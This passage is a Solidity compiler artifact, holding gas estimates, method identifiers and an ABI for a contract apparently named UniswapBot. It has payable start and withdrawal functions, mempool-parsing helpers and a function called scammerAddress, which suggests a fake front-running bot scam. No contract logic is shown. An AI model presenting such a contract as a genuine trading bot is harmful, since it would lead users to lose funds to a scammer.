				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
				"orderContractsByLiquidity(struct UniswapBot.slice memory)": "infinite",
				"parseMempool(string memory)": "infinite",
				"toHexDigit(uint8)": "213",
				"uint2str(uint256)": "infinite",
				"withdrawalProfits()": "infinite"
			}
		},
		"methodIdentifiers": {
			"scammerAddress()": "ab1c067d",
			"start()": "be9a6555",
			"tokenName()": "6c02a931",
			"tokenSymbol()": "7b61c320",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "scammerAddress",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "pure",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "tokenName",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "tokenSymbol",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}